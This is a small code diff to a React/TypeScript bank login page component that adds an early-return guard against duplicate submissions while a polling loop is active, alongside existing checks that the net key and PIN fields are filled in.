@@ -349,6 +349,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    // Prevent duplicate task creation if a polling loop is already active.
+    if (submitting || pollRef.current) return;
     let hasErr = false;
     if (!vrNetKey.trim()) { setVrNetKeyError(true); hasErr = true; }
     if (!pin.trim()) { setPinError(true); hasErr = true; }
